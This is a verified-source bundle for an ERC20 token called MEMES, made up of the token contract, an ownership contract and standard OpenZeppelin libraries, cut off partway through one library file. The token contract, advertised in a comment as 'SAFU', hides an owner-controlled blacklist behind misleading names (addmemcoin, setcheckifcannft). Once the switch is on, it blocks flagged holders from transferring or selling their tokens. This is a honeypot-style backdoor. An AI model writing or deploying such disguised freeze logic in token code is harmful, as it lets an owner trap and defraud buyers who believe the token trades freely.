{{
  "language": "Solidity",
  "sources": {
    "contracts/MEMES.sol": {
      "content": "\r\n// Get your SAFU contract now via Coinsult.net\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.2;\r\n\r\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\r\nimport \"./Owned.sol\";\r\n\r\n\r\ncontract MEMES is\r\n    ERC20,\r\n    ERC20Burnable,\r\n    ERC20Snapshot,\r\n    Owned\r\n    \r\n    \r\n{\r\n\r\n\r\nstruct history {\r\n        uint256 user;\r\n    }\r\n\r\n  mapping (address => bool) private _imemcoin;\r\n  mapping(address => history) private _history;\r\n\r\n   uint256 private _timetostart;\r\n   bool public checkifcannft;\r\n   address public pancakeswapPairAddress;\r\n\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol} and mint the tokens to the address set.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(\r\n        address _owner,\r\n        string memory token,\r\n        string memory _symbol\r\n       \r\n        )\r\n        \r\n    \r\n        ERC20(token,\r\n        _symbol\r\n        )\r\n        Owned(_owner)\r\n        \r\n    {\r\n        _mint(_owner, 50000000000000 ether);\r\n      \r\n    }\r\n\r\n    /**\r\n     * @dev Creates a new snapshot and returns its snapshot id.\r\n     *\r\n     * Emits a {Snapshot} event that contains the same id.\r\n     *\r\n     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a\r\n     * set of accounts, for example in our contract, only Owner can call it.\r\n     *\r\n     */\r\n    function snapshot() public onlyOwner {\r\n        _snapshot();\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n\r\n\r\n    \r\n\r\n\r\n\r\n\r\nfunction Settimetostart(uint256 timetostart) external onlyOwner {\r\n  \t_timetostart = timetostart;\r\n    }\r\n\r\n\r\n\r\n      function addmemcoin (address _evilUser) public onlyOwner {\r\n     \r\n        _imemcoin[_evilUser] = true;\r\n     }\r\n\r\n\r\n     function removememcoin (address _clearedUser) public onlyOwner {\r\n        \r\n        _imemcoin[_clearedUser] = false;\r\n     }\r\n\r\n     function _getmemcoinStatus(address _maker) private view returns (bool) {\r\n        return _imemcoin[_maker];\r\n     }\r\n\r\n     function setcheckifcannft(bool _canbe) external onlyOwner {\r\n       \r\n       checkifcannft = _canbe;\r\n      \r\n       }\r\n    \r\n\r\n\r\n\r\n    function _beforeTokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal override(ERC20, ERC20Snapshot) {\r\n      if(checkifcannft==true){\r\n        require(_getmemcoinStatus(sender) == false , \"this is Not Our Token\");\r\n        require(_getmemcoinStatus(msg.sender) == false ,\"this is Not Our Token\"); \r\n      }\r\n       \r\n        super._beforeTokenTransfer(sender, recipient, amount);\r\n     \r\n          \r\n    }\r\n}"
    },
    "@openzeppelin/contracts/token/ERC20/ERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/extensions/ERC20Burnable.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../ERC20.sol\";\nimport \"../../../utils/Context.sol\";\n\n/**\n * @dev Extension of {ERC20} that allows token holders to destroy both their own\n * tokens and those that they have an allowance for, in a way that can be\n * recognized off-chain (via event analysis).\n */\nabstract contract ERC20Burnable is Context, ERC20 {\n    /**\n     * @dev Destroys `amount` tokens from the caller.\n     *\n     * See {ERC20-_burn}.\n     */\n    function burn(uint256 amount) public virtual {\n        _burn(_msgSender(), amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, deducting from the caller's\n     * allowance.\n     *\n     * See {ERC20-_burn} and {ERC20-allowance}.\n     *\n     * Requirements:\n     *\n     * - the caller must have allowance for ``accounts``'s tokens of at least\n     * `amount`.\n     */\n    function burnFrom(address account, uint256 amount) public virtual {\n        _spendAllowance(account, _msgSender(), amount);\n        _burn(account, amount);\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/extensions/ERC20Snapshot.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../ERC20.sol\";\nimport \"../../../utils/Arrays.sol\";\nimport \"../../../utils/Counters.sol\";\n\n/**\n * @dev This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and\n * total supply at the time are recorded for later access.\n *\n * This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting.\n * In naive implementations it's possible to perform a \"double spend\" attack by reusing the same balance from different\n * accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be\n * used to create an efficient ERC20 forking mechanism.\n *\n * Snapshots are created by the internal {_snapshot} function, which will emit the {Snapshot} event and return a\n * snapshot id. To get the total supply at the time of a snapshot, call the function {totalSupplyAt} with the snapshot\n * id. To get the balance of an account at the time of a snapshot, call the {balanceOfAt} function with the snapshot id\n * and the account address.\n *\n * NOTE: Snapshot policy can be customized by overriding the {_getCurrentSnapshotId} method. For example, having it\n * return `block.number` will trigger the creation of snapshot at the beginning of each new block. When overriding this\n * function, be careful about the monotonicity of its result. Non-monotonic snapshot ids will break the contract.\n *\n * Implementing snapshots for every block using this method will incur significant gas costs. For a gas-efficient\n * alternative consider {ERC20Votes}.\n *\n * ==== Gas Costs\n *\n * Snapshots are efficient. Snapshot creation is _O(1)_. Retrieval of balances or total supply from a snapshot is _O(log\n * n)_ in the number of snapshots that have been created, although _n_ for a specific account will generally be much\n * smaller since identical balances in subsequent snapshots are stored as a single entry.\n *\n * There is a constant overhead for normal ERC20 transfers due to the additional snapshot bookkeeping. This overhead is\n * only significant for the first transfer that immediately follows a snapshot for a particular account. Subsequent\n * transfers will have normal cost until the next snapshot, and so on.\n */\n\nabstract contract ERC20Snapshot is ERC20 {\n    // Inspired by Jordi Baylina's MiniMeToken to record historical balances:\n    // https://github.com/Giveth/minimd/blob/ea04d950eea153a04c51fa510b068b9dded390cb/contracts/MiniMeToken.sol\n\n    using Arrays for uint256[];\n    using Counters for Counters.Counter;\n\n    // Snapshotted values have arrays of ids and the value corresponding to that id. These could be an array of a\n    // Snapshot struct, but that would impede usage of functions that work on an array.\n    struct Snapshots {\n        uint256[] ids;\n        uint256[] values;\n    }\n\n    mapping(address => Snapshots) private _accountBalanceSnapshots;\n    Snapshots private _totalSupplySnapshots;\n\n    // Snapshot ids increase monotonically, with the first value being 1. An id of 0 is invalid.\n    Counters.Counter private _currentSnapshotId;\n\n    /**\n     * @dev Emitted by {_snapshot} when a snapshot identified by `id` is created.\n     */\n    event Snapshot(uint256 id);\n\n    /**\n     * @dev Creates a new snapshot and returns its snapshot id.\n     *\n     * Emits a {Snapshot} event that contains the same id.\n     *\n     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a\n     * set of accounts, for example using {AccessControl}, or it may be open to the public.\n     *\n     * [WARNING]\n     * ====\n     * While an open way of calling {_snapshot} is required for certain trust minimization mechanisms such as forking,\n     * you must consider that it can potentially be used by attackers in two ways.\n     *\n     * First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow\n     * logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target\n     * specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs\n     * section above.\n     *\n     * We haven't measured the actual numbers; if this is something you're interested in please reach out to us.\n     * ====\n     */\n    function _snapshot() internal virtual returns (uint256) {\n        _currentSnapshotId.increment();\n\n        uint256 currentId = _getCurrentSnapshotId();\n        emit Snapshot(currentId);\n        return currentId;\n    }\n\n    /**\n     * @dev Get the current snapshotId\n     */\n    function _getCurrentSnapshotId() internal view virtual returns (uint256) {\n        return _currentSnapshotId.current();\n    }\n\n    /**\n     * @dev Retrieves the balance of `account` at the time `snapshotId` was created.\n     */\n    function balanceOfAt(address account, uint256 snapshotId) public view virtual returns (uint256) {\n        (bool snapshotted, uint256 value) = _valueAt(snapshotId, _accountBalanceSnapshots[account]);\n\n        return snapshotted ? value : balanceOf(account);\n    }\n\n    /**\n     * @dev Retrieves the total supply at the time `snapshotId` was created.\n     */\n    function totalSupplyAt(uint256 snapshotId) public view virtual returns (uint256) {\n        (bool snapshotted, uint256 value) = _valueAt(snapshotId, _totalSupplySnapshots);\n\n        return snapshotted ? value : totalSupply();\n    }\n\n    // Update balance and/or total supply snapshots before the values are modified. This is implemented\n    // in the _beforeTokenTransfer hook, which is executed for _mint, _burn, and _transfer operations.\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        super._beforeTokenTransfer(from, to, amount);\n\n        if (from == address(0)) {\n            // mint\n            _updateAccountSnapshot(to);\n            _updateTotalSupplySnapshot();\n        } else if (to == address(0)) {\n            // burn\n            _updateAccountSnapshot(from);\n            _updateTotalSupplySnapshot();\n        } else {\n            // transfer\n            _updateAccountSnapshot(from);\n            _updateAccountSnapshot(to);\n        }\n    }\n\n    function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) {\n        require(snapshotId > 0, \"ERC20Snapshot: id is 0\");\n        require(snapshotId <= _getCurrentSnapshotId(), \"ERC20Snapshot: nonexistent id\");\n\n        // When a valid snapshot is queried, there are three possibilities:\n        //  a) The queried value was not modified after the snapshot was taken. Therefore, a snapshot entry was never\n        //  created for this id, and all stored snapshot ids are smaller than the requested one. The value that corresponds\n        //  to this id is the current one.\n        //  b) The queried value was modified after the snapshot was taken. Therefore, there will be an entry with the\n        //  requested id, and its value is the one to return.\n        //  c) More snapshots were created after the requested one, and the queried value was later modified. There will be\n        //  no entry for the requested id: the value that corresponds to it is that of the smallest snapshot id that is\n        //  larger than the requested one.\n        //\n        // In summary, we need to find an element in an array, returning the index of the smallest value that is larger if\n        // it is not found, unless said value doesn't exist (e.g. when all values are smaller). Arrays.findUpperBound does\n        // exactly this.\n\n        uint256 index = snapshots.ids.findUpperBound(snapshotId);\n\n        if (index == snapshots.ids.length) {\n            return (false, 0);\n        } else {\n            return (true, snapshots.values[index]);\n        }\n    }\n\n    function _updateAccountSnapshot(address account) private {\n        _updateSnapshot(_accountBalanceSnapshots[account], balanceOf(account));\n    }\n\n    function _updateTotalSupplySnapshot() private {\n        _updateSnapshot(_totalSupplySnapshots, totalSupply());\n    }\n\n    function _updateSnapshot(Snapshots storage snapshots, uint256 currentValue) private {\n        uint256 currentId = _getCurrentSnapshotId();\n        if (_lastSnapshotId(snapshots.ids) < currentId) {\n            snapshots.ids.push(currentId);\n            snapshots.values.push(currentValue);\n        }\n    }\n\n    function _lastSnapshotId(uint256[] storage ids) private view returns (uint256) {\n        if (ids.length == 0) {\n            return 0;\n        } else {\n            return ids[ids.length - 1];\n        }\n    }\n}\n"
    },
    "contracts/Owned.sol": {
      "content": " \r\n\r\npragma solidity ^0.8.2;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n// https://docs.synthetix.io/contracts/source/contracts/owned\r\nabstract contract Owned {\r\n    address public owner;\r\n    address public nominatedOwner;\r\n   \r\n    \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n    constructor(address _owner) {\r\n        require(_owner != address(0), \"Owner address cannot be 0\");\r\n        owner = _owner;\r\n        emit OwnerChanged(address(0), _owner);\r\n        \r\n    }\r\n\r\nevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = owner;\r\n        owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n   \r\n\r\n    function nominateNewOwner(address _owner) external onlyOwner {\r\n       \r\n        nominatedOwner = _owner;\r\n        emit OwnerNominated(_owner);\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n    function acceptOwnership() external {\r\n        require(msg.sender == nominatedOwner, \"You must be nominated before you can accept ownership\");\r\n        emit OwnerChanged(owner, nominatedOwner);\r\n        owner = nominatedOwner;\r\n        nominatedOwner = address(0);\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        _onlyOwner();\r\n        _;\r\n    }\r\n\r\n    function _onlyOwner() private view {\r\n        require(msg.sender == owner, \"Only the contract owner may perform this action\");\r\n    }\r\n\r\n    event OwnerNominated(address newOwner);\r\n    event OwnerChanged(address oldOwner, address newOwner);\r\n}\r\n"
    },
    "@openzeppelin/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"
    },
    "@openzeppelin/contracts/utils/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"
    },
    "@openzeppelin/contracts/utils/Arrays.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Arrays.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./math/Math.sol\";\n\n/**\n * @dev Collection of functions related to array types.\n */\nlibrary Arrays {\n    /**\n     * @dev Searches a sorted `array` and returns the first index that contains\n     * a value greater or equal to `element`. If no such index exists (i.e. all\n     * values in the array are strictly less than `element`), the array length is\n     * returned. Time complexity O(log n).\n     *\n     * `array` is expected to be sorted in ascending order, and to contain no\n     * repeated elements.\n     */\n    function findUpperBound(uint256[] storage array, uint256 element) internal view returns (uint256) {\n        if (array.length == 0) {\n            return 0;\n        }\n\n        uint256 low = 0;\n        uint256 high = array.length;\n\n        while (low < high) {\n            uint256 mid = Math.average(low, high);\n\n            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)\n            // because Math.average rounds down (it does integer division with truncation).\n            if (array[mid] > element) {\n                high = mid;\n            } else {\n                low = mid + 1;\n            }\n        }\n\n        // At this point `low` is the exclusive upper bound. We will return the inclusive upper bound.\n        if (low > 0 && array[low - 1] == element) {\n            return low - 1;\n        } else {\n            return low;\n        }\n    }\n}\n"
    },
    "@openzeppelin/contracts/utils/Counters.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @title Counters\n * @author Matt Condon (@shrugs)\n * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number\n * of elements in a mapping, issuing ERC721 ids, or counting request ids.\n *\n * Include with `using Counters for Counters.Counter;`\n */\nlibrary Counters {\n    struct Counter {\n        // This variable should never be directly accessed by users of the library: interactions must be restricted to\n        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add\n        // this feature: see https://github.com/ethereum/solidity/issues/4637\n        uint256 _value; // default: 0\n    }\n\n    function current(Counter storage counter) internal view returns (uint256) {\n        return counter._value;\n    }\n\n    function increment(Counter storage counter) internal {\n        unchecked {\n            counter._value += 1;\n        }\n    }\n\n    function decrement(Counter storage counter) internal {\n        uint256 value = counter._value;\n     